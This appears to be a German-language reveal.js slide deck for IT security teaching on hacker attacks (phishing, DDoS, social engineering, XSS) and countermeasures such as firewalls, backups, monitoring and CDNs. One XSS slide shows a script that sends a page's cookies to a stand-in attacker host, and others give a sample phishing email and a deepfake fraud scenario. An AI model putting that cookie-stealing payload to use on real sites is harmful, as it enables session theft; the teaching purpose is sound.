@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="utf-8"/>
+<title>Hackerangriffe und Schutzmaßnahmen</title>
+<meta name="author" content="ITT-Net-IS"/>
+<meta name="description" content=""/>
+<meta name="keywords" content=""/>
+<style type="text/css">
+.underline { text-decoration: underline; }
+</style>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css"/>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/league.css" id="theme"/>
+
+<link rel="stylesheet" href="./mystyle.css"/>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section id="sec-title-slide"><h1 class="title">Hackerangriffe und Schutzmaßnahmen</h1><p class="subtitle">IT-Sicherheit</p>
+<h2 class="author">ITT-Net-IS</h2>
+</section>
+
+<section>
+<section id="slide-org38a2b72">
+<h2 id="org38a2b72">Einführung</h2>
+<p>
+"Hackerangriff" bezeichnet einen Versuch, unbefugten Zugriff auf ein Computersystem, Netzwerk oder Daten zu erlangen. Während der Begriff "Hacker" ursprünglich Personen mit tiefgreifendem Technikverständnis beschrieb, wird er heute oft mit Cyberkriminellen assoziiert.
+</p>
+
+
+</section>
+</section>
+<section>
+<section id="slide-orgba771c1">
+<h2 id="orgba771c1">Arten von Hackerangriffen</h2>
+<div class="outline-text-2" id="text-orgba771c1">
+</div>
+</section>
+<section id="slide-org6588fc0">
+<h3 id="org6588fc0">Phishing-Angriffe</h3>
+<p>
+Phishing zielt darauf ab, vertrauliche Informationen wie Passwörter oder Kreditkartendaten durch Täuschung zu erlangen.
+</p>
+
+<aside class="notes">
+<p>
+"Phishing" kommt vom englischen "fishing" (Angeln) und bezeichnet den Versuch, Informationen "zu angeln", indem gefälschte Identitäten oder Websites verwendet werden.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-org451e1ec">
+<h4 id="org451e1ec">Phishing-Varianten</h4>
+<ul>
+<li class="fragment appear"><b>Spear-Phishing</b>: Zielt auf bestimmte Personen oder Organisationen ab</li>
+<li class="fragment appear"><b>Whaling</b>: Spezifisch auf hochrangige Führungskräfte ausgerichtet</li>
+<li class="fragment appear"><b>Smishing</b>: Phishing über SMS</li>
+<li class="fragment appear"><b>Vishing</b>: Phishing über Telefonanrufe (Voice-Phishing)</li>
+
+</ul>
+
+</section>
+<section id="slide-orgee295d0">
+<h4 id="orgee295d0">Beispiel: Typische Phishing-E-Mail</h4>
+<pre class="example" id="orgddf19d7">
+Von: security@bank-service-verify.com
+Betreff: Dringende Sicherheitswarnung - Handlung erforderlich
+
+Sehr geehrter Kunde,
+
+Wir haben ungewöhnliche Aktivitäten auf Ihrem Konto festgestellt. 
+Um eine Sperrung zu verhindern, bestätigen Sie bitte Ihre Identität unter:
+https://bank-verfication-secure.com/login
+
+Mit freundlichen Grüßen,
+Ihr Sicherheitsteam
+</pre>
+
+</section>
+<section id="slide-orgdfac7bc">
+<h3 id="orgdfac7bc">DDoS-Angriffe (Distributed Denial of Service)</h3>
+<p>
+DDoS-Angriffe überlasten Systeme oder Netzwerke mit Anfragen, bis sie nicht mehr reagieren können.
+</p>
+
+<aside class="notes">
+<p>
+"DDoS" steht für "Distributed Denial of Service". Der Angriff wird von vielen verschiedenen Quellen gleichzeitig ausgeführt, was ihn schwer zu blockieren macht.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-org4704f11">
+<h4 id="org4704f11">DDoS-Arten</h4>
+<ul>
+<li class="fragment appear"><b>Volumetrische Angriffe</b>: Überschwemmen Netzwerkbandbreite</li>
+<li class="fragment appear"><b>Protokollangriffe</b>: Ausnutzen von Schwachstellen in Netzwerkprotokollen</li>
+<li class="fragment appear"><b>Anwendungsangriffe</b>: Zielen auf spezifische Anwendungen oder Dienste ab</li>
+
+</ul>
+
+</section>
+<section id="slide-org8426247">
+<h3 id="org8426247">Social Engineering</h3>
+<p>
+Bei Social Engineering werden psychologische Manipulation eingesetzt, um Opfer zur Preisgabe vertraulicher Informationen zu bewegen.
+</p>
+
+<aside class="notes">
+<p>
+"Social Engineering" bezeichnet Techniken der zwischenmenschlichen Manipulation, um Menschen dazu zu bringen, normale Sicherheitsmaßnahmen zu umgehen.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-org833be5a">
+<h4 id="org833be5a">Häufige Social Engineering-Taktiken</h4>
+<ul>
+<li class="fragment appear"><b>Vorwand-Anrufe</b> ("Pretexting"): Erfundene Szenarien zur Informationsgewinnung</li>
+<li class="fragment appear"><b>Baiting</b>: Anbieten von etwas Verlockenden (z.B. kostenlose Downloads), um Schadsoftware zu verbreiten</li>
+<li class="fragment appear"><b>Quid Pro Quo</b>: Versprechen eines Vorteils im Austausch für Informationen</li>
+<li class="fragment appear"><b>Tailgating</b>: Unbefugtes Folgen einer autorisierten Person in gesicherte Bereiche</li>
+
+</ul>
+
+</section>
+<section id="slide-orgaec4443">
+<h3 id="orgaec4443">Andere verbreitete Angriffsarten</h3>
+<ul>
+<li class="fragment appear"><b>SQL-Injection</b>: Einschleusen von schädlichem SQL-Code in Datenbankanfragen</li>
+<li class="fragment appear"><b>Cross-Site Scripting (XSS)</b>: Einbetten bösartiger Skripte in Webseiten</li>
+<li class="fragment appear"><b>Man-in-the-Middle (MITM)</b>: Abfangen und möglicherweise Manipulieren von Kommunikation</li>
+<li class="fragment appear"><b>Brute-Force</b>: Systematisches Durchprobieren aller möglichen Passwörter</li>
+<li class="fragment appear"><b>Zero-Day-Exploits</b>: Ausnutzen unbekannter Sicherheitslücken</li>
+
+</ul>
+
+
+</section>
+<section id="slide-org1d9b551">
+<h4 id="org1d9b551">Beispiel: Cross-Site Scripting (XSS)</h4>
+<div class="org-src-container">
+
+<pre  class="src src-html"   ><code trim><span style="color: #a8a8a8;">&lt;!-- </span><span style="color: #a8a8a8;">B&#246;swilliger Kommentar auf einer Website</span><span style="color: #a8a8a8;"> --&gt;</span>
+&lt;<span style="color: #feacd0;">script</span>&gt;
+  document.addEventListener('DOMContentLoaded', function() {
+    var img = new Image();
+    img.src = 'https://angreifer.com/stehlen?cookies=' + encodeURIComponent(document.cookie);
+    img.style.display = 'none';
+    document.body.appendChild(img);
+  });
+&lt;/<span style="color: #feacd0;">script</span>&gt;
+</code></pre>
+</div>
+
+</section>
+</section>
+<section>
+<section id="slide-orgf5029df">
+<h2 id="orgf5029df">Schutzmaßnahmen gegen Hackerangriffe</h2>
+<div class="outline-text-2" id="text-orgf5029df">
+</div>
+</section>
+<section id="slide-org348be4a">
+<h3 id="org348be4a">Technische Schutzmaßnahmen</h3>
+<div class="outline-text-3" id="text-org348be4a">
+</div>
+</section>
+<section id="slide-org205a624">
+<h4 id="org205a624">Firewalls und Netzwerksicherheit</h4>
+<ul>
+<li class="fragment appear">Implementierung und Konfiguration von Firewalls</li>
+<li class="fragment appear">Segmentierung von Netzwerken</li>
+<li class="fragment appear">Verwendung von Virtual Private Networks (VPNs)</li>
+<li class="fragment appear">Regelmäßige Netzwerküberwachung</li>
+
+</ul>
+
+<aside class="notes">
+<p>
+Eine "Firewall" ist ein Sicherheitssystem, das den Netzwerkverkehr basierend auf vordefinierten Sicherheitsregeln überwacht und kontrolliert.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-orgdd03835">
+<h4 id="orgdd03835">Beispiel: Einfache iptables-Firewall-Konfiguration</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim>  <span style="color: #a8a8a8;"># </span><span style="color: #a8a8a8;">Grundlegende iptables-Firewall-Regeln</span>
+  
+  <span style="color: #a8a8a8;"># </span><span style="color: #a8a8a8;">Standardrichtlinien: Alles ablehnen</span>
+  iptables -P INPUT DROP
+  iptables -P FORWARD DROP
+  iptables -P OUTPUT ACCEPT
+  
+  <span style="color: #a8a8a8;"># </span><span style="color: #a8a8a8;">Lokale Verbindungen erlauben</span>
+  iptables -A INPUT -i lo -j ACCEPT
+  
+  <span style="color: #a8a8a8;"># </span><span style="color: #a8a8a8;">Bestehende Verbindungen erlauben</span>
+  iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+  
+  <span style="color: #a8a8a8;"># </span><span style="color: #a8a8a8;">SSH auf Port 22 erlauben</span>
+  iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+  
+  <span style="color: #a8a8a8;"># </span><span style="color: #a8a8a8;">HTTP und HTTPS erlauben</span>
+  iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+  iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org5afeb16">
+<h4 id="org5afeb16">Aktualisierte Software und Patch-Management</h4>
+<ul>
+<li class="fragment appear">Regelmäßige Updates für Betriebssysteme und Software</li>
+<li class="fragment appear">Automatisierte Patch-Management-Systeme</li>
+<li class="fragment appear">Zeitnahe Anwendung sicherheitsrelevanter Updates</li>
+
+</ul>
+
+</section>
+<section id="slide-orgf85c802">
+<h4 id="orgf85c802">Starke Authentifizierung</h4>
+<ul>
+<li class="fragment appear">Verwendung komplexer Passwörter</li>
+<li class="fragment appear">Implementierung von Zwei-Faktor-Authentifizierung (2FA)</li>
+<li class="fragment appear">Biometrische Authentifizierungsmethoden</li>
+<li class="fragment appear">Single Sign-On (SSO) mit starker Basisauthentifizierung</li>
+
+</ul>
+
+<aside class="notes">
+<p>
+"Zwei-Faktor-Authentifizierung (2FA)" erfordert zwei unterschiedliche Authentifizierungsfaktoren: etwas, das man weiß (Passwort), besitzt (Smartphone) oder ist (Fingerabdruck).
+</p>
+
+</aside>
+
+
+</section>
+<section id="slide-org665ae5e">
+<h4 id="org665ae5e">Verschlüsselung</h4>
+<ul>
+<li class="fragment appear">Festplattenverschlüsselung</li>
+<li class="fragment appear">Verschlüsselung der Kommunikation (TLS/SSL)</li>
+<li class="fragment appear">E-Mail-Verschlüsselung (PGP/GPG)</li>
+<li class="fragment appear">Verschlüsselung von Backups</li>
+
+</ul>
+
+</section>
+<section id="slide-org815dad8">
+<h4 id="org815dad8">Regelmäßige Backups</h4>
+<ul>
+<li class="fragment appear">3-2-1-Backup-Strategie: 3 Kopien, 2 verschiedene Medien, 1 Off-Site</li>
+<li class="fragment appear">Regelmäßige Tests der Wiederherstellungsprozesse</li>
+<li class="fragment appear">Unveränderliche (immutable) Backups gegen Ransomware</li>
+
+</ul>
+
+</section>
+<section id="slide-org39118a1">
+<h3 id="org39118a1">Organisatorische Schutzmaßnahmen</h3>
+<div class="outline-text-3" id="text-org39118a1">
+</div>
+</section>
+<section id="slide-org75c5fab">
+<h4 id="org75c5fab">Sicherheitsrichtlinien und -verfahren</h4>
+<ul>
+<li class="fragment appear">Dokumentierte Sicherheitsrichtlinien</li>
+<li class="fragment appear">Klare Verantwortlichkeiten und Rollen</li>
+<li class="fragment appear">Incident-Response-Pläne</li>
+<li class="fragment appear">Regelmäßige Sicherheitsaudits</li>
+
+</ul>
+
+<aside class="notes">
+<p>
+"Incident-Response-Plan" ist ein dokumentierter Ablaufplan, der festlegt, wie eine Organisation auf Sicherheitsvorfälle reagieren soll.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-org807ae9d">
+<h4 id="org807ae9d">Mitarbeiterschulung und Sensibilisierung</h4>
+<ul>
+<li class="fragment appear">Regelmäßige Sicherheitsschulungen</li>
+<li class="fragment appear">Phishing-Simulationen</li>
+<li class="fragment appear">Sicherheitsbewusstsein im Arbeitsalltag fördern</li>
+<li class="fragment appear">Klare Meldewege für verdächtige Aktivitäten</li>
+
+</ul>
+
+</section>
+<section id="slide-orga5c40c1">
+<h4 id="orga5c40c1">Beispiel: Checkliste für Sicherheitsbewusstsein</h4>
+<p class="fragment (appear)">
+□ Verdächtige E-Mails an IT-Sicherheit melden
+□ Keine unbekannten USB-Sticks verwenden
+□ Starke, einzigartige Passwörter für jeden Dienst nutzen
+□ Zwei-Faktor-Authentifizierung aktivieren
+□ Öffentliches WLAN nur mit VPN nutzen
+□ Bildschirm sperren, wenn Arbeitsplatz verlassen wird
+□ Regelmäßig an Sicherheitsschulungen teilnehmen
+□ Vorsicht bei unerwarteten Anhängen oder Links
+</p>
+
+
+</section>
+<section id="slide-orgd40bd1c">
+<h4 id="orgd40bd1c">Zugriffskontrollen und Berechtigungsverwaltung</h4>
+<p>
+EXAMPLE
+</p>
+<ul>
+<li>Prinzip der geringsten Berechtigung</li>
+<li>Regelmäßige Überprüfung von Zugriffsrechten</li>
+<li>Prozesse für Onboarding und Offboarding von Mitarbeitern</li>
+<li>Privilegierte Konten besonders schützen</li>
+
+</ul>
+
+<aside class="notes">
+<p>
+Das "Prinzip der geringsten Berechtigung" (Principle of Least Privilege) besagt, dass Benutzer nur die minimal notwendigen Rechte erhalten sollten, um ihre Aufgaben zu erfüllen.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-org757774b">
+<h3 id="org757774b">Überwachung und Reaktion</h3>
+<div class="outline-text-3" id="text-org757774b">
+</div>
+</section>
+<section id="slide-org04cbbbf">
+<h4 id="org04cbbbf">Sicherheitsüberwachung</h4>
+<p>
+EXAMPLE
+</p>
+<ul>
+<li>Intrusion Detection/Prevention Systeme (IDS/IPS)</li>
+<li>Security Information and Event Management (SIEM)</li>
+<li>Anomalieerkennung</li>
+<li>Honeypots zur Angriffserkennung</li>
+
+</ul>
+
+<aside class="notes">
+<p>
+"SIEM" (Security Information and Event Management) sammelt und analysiert Sicherheitsdaten aus verschiedenen Quellen, um Bedrohungen zu erkennen und darauf zu reagieren.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-orge3c1236">
+<h4 id="orge3c1236">Beispiel: Log-Analyse mit ELK Stack</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim>  <span style="color: #a8a8a8;"># </span><span style="color: #a8a8a8;">Beispiel f&#252;r einfache Analyse von Zugriffsprotokollen mit grep</span>
+  <span style="color: #a8a8a8;"># </span><span style="color: #a8a8a8;">Suche nach fehlgeschlagenen SSH-Anmeldeversuchen</span>
+  
+  grep <span style="color: #79a8ff;">"Failed password"</span> /var/log/auth.log | <span style="color: #79a8ff;">\</span>
+      awk <span style="color: #79a8ff;">'{print $11}'</span> | <span style="color: #79a8ff;">\</span>
+      sort | uniq -c | sort -nr | <span style="color: #79a8ff;">\</span>
+      head -n 10
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org6cc9068">
+<h4 id="org6cc9068">Incident Response</h4>
+<ul>
+<li class="fragment appear">Festgelegte Reaktionspläne für verschiedene Angriffsszenarien</li>
+<li class="fragment appear">Klar definierte Rollen und Verantwortlichkeiten</li>
+<li class="fragment appear">Kommunikationsstrategien während eines Vorfalls</li>
+<li class="fragment appear">Forensische Untersuchungsprozesse</li>
+
+</ul>
+
+</section>
+<section id="slide-org6706e59">
+<h4 id="org6706e59">Penetrationstests und Schwachstellenscans</h4>
+<ul>
+<li class="fragment appear">Regelmäßige Schwachstellenscans</li>
+<li class="fragment appear">Externe Penetrationstests</li>
+<li class="fragment appear">Red-Team-Übungen</li>
+<li class="fragment appear">Bug-Bounty-Programme</li>
+
+</ul>
+
+<aside class="notes">
+<p>
+"Red-Team-Übungen" sind simulierte Angriffe durch ein Team von Sicherheitsexperten, die versuchen, die Verteidigungsmaßnahmen einer Organisation zu überwinden, um Schwachstellen zu identifizieren.
+</p>
+
+</aside>
+
+
+</section>
+<section id="slide-org912eb08">
+<h3 id="org912eb08">Content Delivery Networks (CDN) als Schutzmaßnahme</h3>
+<p>
+Content Delivery Networks sind verteilte Netzwerke von Servern, die Website-Inhalte an verschiedenen geografischen Standorten zwischenspeichern und ausliefern.
+</p>
+
+<aside class="notes">
+<p>
+"CDN" steht für "Content Delivery Network" und bezeichnet ein Netzwerk geografisch verteilter Server, die zusammenarbeiten, um digitale Inhalte schnell und zuverlässig bereitzustellen. Ursprünglich zur Leistungsverbesserung entwickelt, haben CDNs heute wichtige Sicherheitsfunktionen.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-orgac1c8cf">
+<h4 id="orgac1c8cf">Funktionsweise eines CDN</h4>
+<ul>
+<li class="fragment appear">Verteilung von Inhalten auf mehrere Server weltweit</li>
+<li class="fragment appear">Auslieferung von Inhalten vom geografisch nächsten Server</li>
+<li class="fragment appear">Zwischenspeicherung (Caching) statischer Inhalte</li>
+<li class="fragment appear">Lastverteilung zwischen Servern</li>
+<li class="fragment appear">Netzwerkoptimierung durch effiziente Routing-Mechanismen</li>
+
+</ul>
+
+</section>
+<section id="slide-org1d9158f">
+<h4 id="org1d9158f">CDN als DDoS-Schutz</h4>
+<p>
+CDNs bieten mehrere Schutzmechanismen gegen DDoS-Angriffe:
+</p>
+
+</section>
+<section id="slide-orgdf11b8d">
+<h5 id="orgdf11b8d">Angriffsverdünnung durch Verteilung</h5>
+<ul>
+<li class="fragment appear">Verteilung des Datenverkehrs auf zahlreiche Server weltweit</li>
+<li class="fragment appear">Einzelne Server werden nicht überlastet</li>
+<li class="fragment appear">Angriffsdaten werden über ein größeres Netzwerk verteilt</li>
+
+</ul>
+
+</section>
+<section id="slide-org6c2889e">
+<h5 id="org6c2889e">Traffic-Filterung und Anomalieerkennung</h5>
+<ul>
+<li class="fragment appear">Erkennung ungewöhnlicher Verkehrsmuster in Echtzeit</li>
+<li class="fragment appear">Unterscheidung zwischen legitimen Benutzern und Angreifern</li>
+<li class="fragment appear">Automatische Blockierung verdächtiger IP-Adressen</li>
+<li class="fragment appear">Layer 3/4 und Layer 7 Schutz (Netzwerk- und Anwendungsebene)</li>
+
+</ul>
+
+</section>
+<section id="slide-orgcec1a99">
+<h5 id="orgcec1a99">Überkapazität und Skalierung</h5>
+<ul>
+<li class="fragment appear">CDNs verfügen über massive Bandbreitenreserven</li>
+<li class="fragment appear">Können plötzliche Verkehrsspitzen absorbieren</li>
+<li class="fragment appear">Dynamische Skalierung bei Bedarf</li>
+
+</ul>
+
+</section>
+<section id="slide-org5b0dce2">
+<h5 id="org5b0dce2">Bot-Management</h5>
+<ul>
+<li class="fragment appear">Identifizierung und Blockierung von Bot-Netzwerken</li>
+<li class="fragment appear">CAPTCHA-Integration für verdächtige Anfragen</li>
+<li class="fragment appear">Rate-Limiting für einzelne IP-Adressen</li>
+
+</ul>
+
+</section>
+<section id="slide-org70e9695">
+<h4 id="org70e9695">Beispiel: CDN-Konfiguration mit Cloudflare</h4>
+<div class="org-src-container">
+
+<pre  class="src src-yaml"   ><code trim>  # Beispiel einer Cloudflare-Konfiguration (als .cloudflare.yaml)
+  
+  # DDoS-Schutzeinstellungen
+  ddos_protection:
+    security_level: high      # Sicherheitsstufe (low, medium, high)
+    challenge_ttl: 3600       # Gültigkeitsdauer von Sicherheitsabfragen in Sekunden
+    rate_limiting:
+      enabled: true
+      threshold: 100          # Maximale Anfragen pro Minute
+      action: challenge       # Aktion bei Überschreitung (challenge, block, js_challenge)
+  
+  # WAF (Web Application Firewall) Regeln
+  waf:
+    enabled: true
+    ruleset: cloudflare      # Verwendetes Regelset
+    custom_rules:
+      - description: "Blockiere verdächtige User-Agents"
+        expression: "http.user_agent contains 'scraper' or http.user_agent contains 'bot'"
+        action: block
+  
+  # Caching-Einstellungen
+  cache:
+    enabled: true
+    ttl: 86400               # Caching-Dauer in Sekunden (24 Stunden)
+    browser_ttl: 14400       # Browser-Cache-Dauer (4 Stunden)
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org38bb0bf">
+<h4 id="org38bb0bf">Vor- und Nachteile von CDNs</h4>
+<div class="outline-text-4" id="text-org38bb0bf">
+</div>
+</section>
+<section id="slide-orgec1a9bf">
+<h5 id="orgec1a9bf">Vorteile</h5>
+<ul>
+<li class="fragment appear">Effektiver Schutz gegen volumetrische DDoS-Angriffe</li>
+<li class="fragment appear">Verbesserung der Website-Ladezeiten</li>
+<li class="fragment appear">Reduzierung der Last auf Ursprungsservern</li>
+<li class="fragment appear">Globale Verteilung für Ausfallsicherheit</li>
+
+</ul>
+
+</section>
+<section id="slide-org0522ab5">
+<h5 id="org0522ab5">Nachteile</h5>
+<ul>
+<li class="fragment appear">Potenzielle Abhängigkeit von einem externen Dienstleister</li>
+<li class="fragment appear">Mögliche Komplexität bei der Konfiguration</li>
+<li class="fragment appear">Zusätzliche Kosten bei hohem Datenverkehr</li>
+<li class="fragment appear">Bei unsachgemäßer Konfiguration mögliche Datenschutzprobleme</li>
+
+</ul>
+
+</section>
+<section id="slide-orgfb46d96">
+<h4 id="orgfb46d96">Einsatzstrategien für CDNs</h4>
+<ul>
+<li class="fragment appear">Kombination mit lokalen Schutzmaßnahmen (Defense-in-Depth)</li>
+<li class="fragment appear">Absicherung kritischer Webanwendungen und APIs</li>
+<li class="fragment appear">Entwicklung von Notfallplänen für den Fall einer CDN-Störung</li>
+<li class="fragment appear">Regelmäßige Überprüfung und Anpassung der CDN-Konfiguration</li>
+
+</ul>
+
+<aside class="notes">
+<p>
+Die Nutzung eines CDN ist eine proaktive Maßnahme, die sowohl die Leistung als auch die Sicherheit einer Website verbessert. Als Teil einer umfassenden Sicherheitsstrategie sollte ein CDN mit anderen Sicherheitsmaßnahmen wie Firewalls, Intrusion Detection und regelmäßigen Sicherheitsaudits kombiniert werden.
+</p>
+
+</aside>
+
+</section>
+</section>
+<section>
+<section id="slide-orga64399f">
+<h2 id="orga64399f">Aktuelle Angriffsszenarien (2024-2025)</h2>
+<div class="outline-text-2" id="text-orga64399f">
+</div>
+</section>
+<section id="slide-org564c03c">
+<h3 id="org564c03c">Erweiterte Phishing-Techniken</h3>
+<ul>
+<li class="fragment appear">KI-generierte Phishing-Nachrichten</li>
+<li class="fragment appear">Gezielte Spear-Phishing-Angriffe mit präzisen persönlichen Informationen</li>
+<li class="fragment appear">Manipulation von Geschäftskommunikation (Business Email Compromise)</li>
+<li class="fragment appear">Mehrsprachige und kulturell angepasste Phishing-Kampagnen</li>
+
+</ul>
+
+</section>
+<section id="slide-orgf16a77a">
+<h3 id="orgf16a77a">Cloud-Sicherheitsbedrohungen</h3>
+<ul>
+<li class="fragment appear">Fehlkonfigurationen in Cloud-Umgebungen</li>
+<li class="fragment appear">Angriffe auf APIs</li>
+<li class="fragment appear">Container-Sicherheitslücken</li>
+<li class="fragment appear">Identity and Access Management (IAM) Schwachstellen</li>
+
+</ul>
+
+</section>
+<section id="slide-org83c2535">
+<h3 id="org83c2535">Angriffe auf Lieferketten</h3>
+<ul>
+<li class="fragment appear">Kompromittierung von Software-Lieferketten</li>
+<li class="fragment appear">Angriffe auf vertrauenswürdige Software-Updates</li>
+<li class="fragment appear">Manipulation von Open-Source-Paketen</li>
+<li class="fragment appear">Kompromittierung von Entwicklungsumgebungen</li>
+
+</ul>
+
+<aside class="notes">
+<p>
+"Lieferkettenangriffe" zielen auf die Kompromittierung von Software oder Hardware während des Entwicklungs- oder Verteilungsprozesses ab, oft bevor sie den Endverbraucher erreicht.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-org0e383b5">
+<h3 id="org0e383b5">IoT-Bedrohungen</h3>
+<ul>
+<li>Angriffe auf unzureichend gesicherte IoT-Geräte</li>
+<li>Botnets aus kompromittierten IoT-Geräten</li>
+<li>Smart-Home-Schwachstellen</li>
+<li>Industrielle IoT-Sicherheitsprobleme</li>
+
+</ul>
+
+<aside class="notes">
+<p>
+"IoT" (Internet of Things) bezeichnet Alltagsgeräte, die mit dem Internet verbunden sind und Daten sammeln, austauschen und verarbeiten können.
+</p>
+
+</aside>
+
+</section>
+<section id="slide-org394a2b4">
+<h3 id="org394a2b4">Deepfakes und KI-gestützte Angriffe</h3>
+<ul>
+<li class="fragment appear">Täuschend echte Stimm- und Videomanipulationen</li>
+<li class="fragment appear">Automatisierte Social-Engineering-Angriffe</li>
+<li class="fragment appear">Umgehung von biometrischen Sicherheitssystemen</li>
+<li class="fragment appear">Generative KI zur Erstellung täuschend echter Phishing-Inhalte</li>
+
+</ul>
+
+</section>
+<section id="slide-orgd3b809a">
+<h4 id="orgd3b809a">Beispiel: Deepfake-basierte CEO-Betrugsmasche</h4>
+<pre class="example" id="orgcfebd64">
+Ein Finanzmanager erhält einen Videoanruf, der scheinbar vom CEO des Unternehmens kommt. 
+Die Person sieht aus und klingt genau wie der CEO, ist jedoch ein Deepfake.
+
+Der falsche CEO erklärt, dass eine dringende, vertrauliche Übernahme im Gange sei und 
+sofort eine Vorauszahlung an ein Treuhandkonto geleistet werden müsse. 
+Er betont die Dringlichkeit und Vertraulichkeit, um den normalen Genehmigungsprozess 
+zu umgehen.
+</pre>
+
+</section>
+</section>
+<section>
+<section id="slide-org1a60c15">
+<h2 id="org1a60c15">Praxisaufgabe: Recherche aktueller Angriffsszenarien</h2>
+</section>
+<section id="slide-orgcf7292b">
+<h3 id="orgcf7292b">Aufgabenstellung</h3>
+<ol>
+<li>Recherchieren Sie ein aktuelles Angriffsszenario aus den Jahren 2024-2025</li>
+<li>Analysieren Sie:
+<ul>
+<li>Art des Angriffs</li>
+<li>Betroffene Systeme und Organisationen</li>
+<li>Angriffsmethode und -verlauf</li>
+<li>Auswirkungen und Schäden</li>
+<li>Gegenmaßnahmen und Lehren</li>
+
+</ul></li>
+<li>Erstellen Sie eine Präsentation (10-15 Minuten)</li>
+<li>Bereiten Sie praktische Empfehlungen vor, wie sich Unternehmen vor ähnlichen Angriffen schützen können</li>
+
+</ol>
+
+</section>
+<section id="slide-org59e0a46">
+<h3 id="org59e0a46">Bewertungskriterien</h3>
+<ul>
+<li>Tiefe und Qualität der Recherche (10 Punkte)</li>
+<li>Verständnis der technischen Details (5 Punkte)</li>
+<li>Qualität der Präsentation (5 Punkte)</li>
+<li>Praxisrelevanz der Empfehlungen (5 Punkte)</li>
+
+</ul>
+
+</section>
+</section>
+<section>
+<section id="slide-org4af7a54">
+<h2 id="org4af7a54">Literatur und weiterführende Ressourcen</h2>
+<div class="outline-text-2" id="text-org4af7a54">
+</div>
+</section>
+<section id="slide-org0e0c78c">
+<h3 id="org0e0c78c">Bücher</h3>
+<ul>
+<li>Ross J. Anderson: "Security Engineering" (3. Auflage, 2020)</li>
+<li>Kim Zetter: "Countdown to Zero Day" (2015)</li>
+<li>Bruce Schneier: "Click Here to Kill Everybody" (2018)</li>
+
+</ul>
+
+</section>
+<section id="slide-orge7833a4">
+<h3 id="orge7833a4">Online-Ressourcen</h3>
+<ul>
+<li>OWASP Top 10: <a href="https://owasp.org/Top10/">https://owasp.org/Top10/</a></li>
+<li>NIST Cybersecurity Framework: <a href="https://www.nist.gov/cyberframework">https://www.nist.gov/cyberframework</a></li>
+<li>BSI IT-Grundschutz: <a href="https://www.bsi.bund.de/grundschutz">https://www.bsi.bund.de/grundschutz</a></li>
+
+</ul>
+
+</section>
+<section id="slide-orgeec4158">
+<h3 id="orgeec4158">Podcasts und Blogs</h3>
+<ul>
+<li>Darknet Diaries (Podcast)</li>
+<li>Passwort Podcast von Heise (Podcast)</li>
+<li>Risky Buisness (Podcast)</li>
+<li>Krebs on Security (Blog)</li>
+<li>The Hacker News (Website)</li>
+<li>heise Security (deutschsprachiges Portal)</li>
+
+</ul>
+
+</section>
+</section>
+<section>
+<section id="slide-org349731c">
+<h2 id="org349731c">Glossar</h2>
+<ul>
+<li><b>APT (Advanced Persistent Threat)</b>: Komplexe, langfristige Angriffe, oft staatlich gesponsert</li>
+<li><b>CVE (Common Vulnerabilities and Exposures)</b>: Standardisierte Kennungen für bekannte Sicherheitslücken</li>
+<li><b>Exploit</b>: Code oder Technik zur Ausnutzung einer Sicherheitslücke</li>
+<li><b>Hashing</b>: Kryptografische Einwegfunktion zur Datenintegritätsprüfung</li>
+<li><b>MITM (Man-in-the-Middle)</b>: Angriff, bei dem Kommunikation abgefangen wird</li>
+<li><b>Pen-Test (Penetrationstest)</b>: Autorisierter Simulationsangriff zur Sicherheitsprüfung</li>
+<li><b>Sandbox</b>: Isolierte Umgebung zum Testen potenziell gefährlicher Software</li>
+<li><b>Zero-Day</b>: Unbekannte Sicherheitslücke ohne verfügbaren Patch</li>
+
+</ul>
+</section>
+</section>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/markdown/markdown.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/zoom/zoom.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/notes/notes.js"></script>
+
+
+<script>
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+plugins: [RevealMarkdown, RevealZoom, RevealNotes]
+});
+
+</script>
+</body>
+</html>
